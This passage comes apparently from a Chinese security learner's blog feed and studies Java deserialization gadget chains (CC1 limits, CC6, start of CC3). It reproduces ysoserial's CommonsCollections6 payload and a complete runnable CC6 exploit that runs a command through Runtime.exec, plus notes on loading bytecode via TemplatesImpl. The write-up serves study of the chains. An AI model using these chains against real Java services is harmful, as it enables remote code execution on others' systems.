&#123;Map.class&#125;,handler);</span><br><span class="line">    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(handler);</span><br><span class="line">    oos.close();</span><br><span class="line">    System.out.println(barr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deserialize</span></span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比之后可以发现ysoserial的transformers多了<code>new ConstantTransformer(1)</code></p>
<blockquote>
<p>ysoserialPOC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令</p>
</blockquote>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>CC1并不适用于高版本的jdk中，在8u321中测试的时候，cc1就不可以了，浅浅分析一下原因</p>
<p>按照ysoserial的Gadget来，最主要部分就是前面调用LazyMap.get的过程，那么我们可以去看一下<code>AnnotationInvocationHandler</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>我们可以发现<code>AnnotationInvocationHandler.readObject()</code>的代码变了（<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">对比</a></p>
<p>这里删去了<code>s.defaultReadObject()</code>，增加了<code>GetField var2 = var1.readFields()</code>，使得在后面获取<code>memberValues</code>的时候获取的值并不是我们需要的<code>LazyMap</code>，从而不能实现invoke的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error:java.lang.Override missing element entrySet</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p>意识流碎碎念</p>
</blockquote>
<p>真的花了很长的时间来看CC1，一方面是在审计java的适应期，一方面是大部分时间在上课和补作业（不敢在上课玩电脑的屑</p>
<p>审计下来因为对java的不熟悉，所以有时候一晚上的时间也没能看懂多少，处于一种云里雾里的状态，不过到后来对类越来越熟悉之后就顺畅多了，虽然还是留下了亿点点问题</p>
<p>虽然特地学了一下动态代理，但是在走<code>LazyMap</code>链的时候，还是因为不能理解而卡在怎么才能调用<code>AnnotationInvocationHandler#invoke</code>上好一会</p>
<p>虽然算是走了一遍，但是感觉还是得再过几遍，不过也要开始看下一个Gadget了！（</p>
<p>最后感想，P神不愧是神！</p>
<p>再次特别感谢P神、<a href="https://amiaaaz.github.io/2022/03/23/java-study-notes-03/#lazymap">AmiaaaZ</a>师傅（虽然师傅并不认识我</p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>学习使我快乐得一</tag>
        <tag>CC1</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅲ</title>
    <url>/2022/04/13/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A2/</url>
    <content><![CDATA[<blockquote>
<p>CC6、CC3、RMI简单入门、JNDI入门 （之后先去学一下fastjson反序列化</p>
</blockquote>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><p>为了解决CC1在高版本jdk中不适用的局限，我们来审计一下没有版本限制的CC6</p>
<span id="more"></span>

<p>这次就先不跟着P神了！</p>
<p>ysoserial的Gadget chain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        ···</span><br></pre></td></tr></table></figure>

<p>ysoserial poc:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// 得到被LazyMap装饰的恶意Map</span></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain); </span><br><span class="line">        <span class="comment">// 将lazyMap传给TiedMapEntry 为了后续调用LazyMap.get</span></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);<span class="comment">// key = &quot;foo&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 实例化一个HashMap</span></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>); <span class="comment">// new HashMap(1)</span></span><br><span class="line">        <span class="comment">// 增加一个key 且指向的value为null</span></span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>); <span class="comment">// HashMap.put(&quot;foo&quot;,new Object())  key = &quot;foo&quot; &gt;&gt; key.hashCode</span></span><br><span class="line">        </span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>); <span class="comment">// f = (HashMap)map</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map); <span class="comment">// key = map,key.hashCode()</span></span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>); <span class="comment">// f2 = HashMap.table</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123; <span class="comment">// HashMap &quot;foo&quot;</span></span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将TiedMapEntry set到HashSet中</span></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry); <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将HashSet当作对象序列化 在反序列化的时候调用HashSet的readObject</span></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections6.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用到了新的类<code>TiedMapEntry</code>，那就先去浅浅了解一下</p>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.map = map; <span class="comment">// 在构造方法中将我们的LazyMap传进去</span></span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key); <span class="comment">// 调用LazyMap.get()方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue(); <span class="comment">// 调用getValue触发LazyMap.get()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在<code>TiedMapEntry</code>上面的逻辑很明显，就是外面调用<code>TiedMapEntry#hashCode</code>=&gt;<code>TiedMapEntry#getValue</code>=&gt;<code>LazyMap#get</code></p>
<h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity); <span class="comment">// 实例化一个HashMap类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>; <span class="comment">// HashMap.put &gt;&gt; HashMap.hash &gt;&gt; e.hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以发现的readObject中有<code>(HashMap)map.put(e,PRESENT)</code>，所以我们可以将<code>TiedMapEntry</code>传进去，从而调用到了<code>TiedMapEntry#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    ···</span><br><span class="line">    ···</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="P神のchain"><a href="#P神のchain" class="headerlink" title="P神のchain"></a>P神のchain</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>和ysoserial相比，P神把<code>HashSet</code>删掉了，因为在<code>HashMap</code>的<code>readObject</code>中就会直接调用<code>hash</code>，所以当我们把<code>TiedMapEntry</code>当作key传入之后也就是会直接调用<code>TiedMapEntry.hashCode()</code>，直接完成了这条链子</p>
<p>直接编写这条链子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain); <span class="comment">// 被LazyMap装饰的恶意Map</span></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>); <span class="comment">// 将恶意Map传作TiedMapEntry的map对象</span></span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">         <span class="comment">// 为了调用TiedMapEntry#hashCode 将tiedMapEntry当作key传给新的HashMap 并将expMap作为对象来序列化</span></span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>); </span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>); <span class="comment">// 为了防止前面put的时候也触发hashCode</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的transformers数组set进ChainedTransformer 覆盖掉前面的fakeTransformers</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">        ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总的来说CC6理解起来并不难，但是ysoserial有一部分代码的作用大概能理解，但是其中具体的逻辑还没有厘清</p>
<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p>（&lt;8u71</p>
<blockquote>
<p>照样这次先自己学着看ysoserial的payload，不懂再看P神的讲解</p>
</blockquote>
<h4 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h4><p>在仔细分析链子之前，我们先来学一下<code>TemplatesImpl</code>类</p>
<h5 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h5><p>首先学习一下字节码是什么</p>
<p>严格来说，java字节码其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中；总所周知，java是可以跨平台的，只要代码被编译成字节码文件（.class文件）就可以在java虚拟机中运行</p>
<h5 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h5><p><img src="https://img-blog.csdnimg.cn/44f01b0549ea4e47a20d9b9fa42f66cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<ul>
<li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass </li>
<li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </li>
<li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
</ul>
<blockquote>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇 中进行过说明），在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目 标机器上执行任意代码，需要想办法调用构造函数。</p>
</blockquote>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>在利用TemplatesImpl构造攻击链的时候就会涉及到<code>defineClass</code></p>
<p>定义了一个内部类，继承于ClassLoader，在这里还重写了<code>defineClass</code>，默认为default</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">    ……</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在·<code>TemplatesImpl#defineTransletClasses</code>会存在调用，而<code>_bytecodes</code>又是我们可控的，而<code>defineTransletClasses</code>域是public，所以是可以在外部进行调用的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// loader 为TransletClassLoader</span></span><br><span class="line">    <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line">    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">        _transletIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以在<code>TemplatesImpl#getTransletInstance</code>发现对<code>defineTransletClasses</code>的调用，但是这个方法是private，再继续跟进调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// _name 不为null</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses(); <span class="comment">// 实现调用 defineClass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现最开始调用的都是public</p>
